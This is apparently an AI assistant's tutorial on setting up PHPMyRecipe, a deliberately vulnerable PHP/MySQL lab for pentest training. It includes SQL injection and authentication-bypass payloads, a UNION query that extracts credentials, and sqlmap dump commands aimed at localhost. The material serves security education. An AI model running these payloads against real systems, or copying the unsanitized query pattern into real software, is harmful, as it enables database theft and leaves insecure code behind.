## 1. What is PHPMyRecipe?

PHPMyRecipe is a deliberately vulnerable web application designed for **web application penetration testing training**.
It simulates a **recipe-sharing application** where users can view, add, and search for recipes.
The app uses **PHP** and **MySQL** as its backend, and the code contains intentionally insecure SQL queries and poor validation.

This makes it a great platform for learning and practicing:

* **SQL Injection (SQLi)**
* **Authentication Bypass**
* **Cross-Site Scripting (XSS)**
* **Insecure Direct Object Reference (IDOR)**
* **Basic Misconfigurations**

**Example Scenario**:
The search box on the app lets you type a recipe name. Internally, it runs something like:

```php
$query = "SELECT * FROM recipes WHERE name = '" . $_GET['recipe'] . "'";
```

This query is **vulnerable to SQL Injection**, because user input (`$_GET['recipe']`) is directly concatenated without sanitization.

---

## 2. Why PHPMyRecipe is Useful

* Provides a **realistic web app environment**.
* Lightweight, simple to set up.
* Perfect for learning **manual SQLi exploitation** before using automated tools.
* Can be connected with **Burp Suite** or **sqlmap** for advanced exploitation.
* Ideal for beginners in bug bounty / pentesting.

---

## 3. Installation (Step by Step)

### Prerequisites:

* PHP (>= 7.x recommended)
* MySQL or MariaDB
* Apache/Nginx (XAMPP, WAMP, or LAMP stack is easiest)
* Git (optional)

---

### Method 1: Install on XAMPP (Windows/Linux/Mac)

1. **Download & Install XAMPP**

   * Get it from: [https://www.apachefriends.org/](https://www.apachefriends.org/)
   * Install and start **Apache** + **MySQL**.

2. **Download PHPMyRecipe**

   * If repo available:

     ```bash
     git clone https://github.com/<repo>/PHPMyRecipe.git
     ```
   * Or manually download ZIP and extract into:

     ```
     C:\xampp\htdocs\phpmyrecipe
     ```

3. **Create Database**

   * Go to `http://localhost/phpmyadmin`
   * Create database: `phpmyrecipe`
   * Import the SQL file (usually `database.sql` provided in repo).

4. **Configure Database Connection**

   * Edit `config.php` (inside app folder):

     ```php
     $db_host = "localhost";
     $db_user = "root";
     $db_pass = "";
     $db_name = "phpmyrecipe";
     ```

5. **Run the App**

   * Open browser: `http://localhost/phpmyrecipe`
   * You should see the **Recipe Application UI**.

---

### Method 2: Install on Kali Linux (LAMP)

```bash
sudo apt update
sudo apt install apache2 mariadb-server php php-mysqli unzip git -y
```

1. **Clone the app**:

   ```bash
   cd /var/www/html
   sudo git clone https://github.com/<repo>/PHPMyRecipe.git phpmyrecipe
   sudo chown -R www-data:www-data phpmyrecipe
   ```

2. **Setup DB**:

   ```bash
   sudo mysql -u root -p
   CREATE DATABASE phpmyrecipe;
   USE phpmyrecipe;
   SOURCE /var/www/html/phpmyrecipe/database.sql;
   ```

3. **Configure Apache** (optional, if needed).

4. Open in browser:

   ```
   http://127.0.0.1/phpmyrecipe
   ```

---

## 4. Example: SQL Injection on PHPMyRecipe

Suppose the **Search Recipe** page has this URL:

```
http://localhost/phpmyrecipe/search.php?recipe=chicken
```

Internally, it runs:

```sql
SELECT * FROM recipes WHERE name = 'chicken';
```

### Exploitation

If we input:

```
chicken' OR '1'='1
```

Query becomes:

```sql
SELECT * FROM recipes WHERE name = 'chicken' OR '1'='1';
```

This will **dump all recipes** because `'1'='1'` is always true.

---

### Example 2: UNION-based SQLi

Input:

```
' UNION SELECT null, username, password FROM users-- -
```

This can return **usernames and passwords** from the `users` table.

---

## 5. Using SQLMap on PHPMyRecipe

Basic command:

```bash
sqlmap -u "http://localhost/phpmyrecipe/search.php?recipe=chicken" --dbs
```

* `--dbs`: lists databases.

Then:

```bash
sqlmap -u "http://localhost/phpmyrecipe/search.php?recipe=chicken" -D phpmyrecipe --tables
```

* Lists tables in `phpmyrecipe`.

Finally:

```bash
sqlmap -u "http://localhost/phpmyrecipe/search.php?recipe=chicken" -D phpmyrecipe -T users --dump
```

* Dumps all users and passwords.

---

## 6. Practice Exercises

1. Find **SQL Injection** in search function.
2. Exploit **authentication bypass** (e.g., login with `' OR '1'='1 --`).
3. Identify if **XSS** exists in recipe comments.
4. Try **sqlmap** automation.
5. Explore database schema and extract users.

---


هل تحب أكتبلك نسخة زي **training lab notes** (Markdown format) زي ما بنعمل لتوثيق الثغرات على GitHub بحيث يبقى مرتب تحت عناوين زي *Overview, Setup, Exploitation, Examples, Exercises*؟
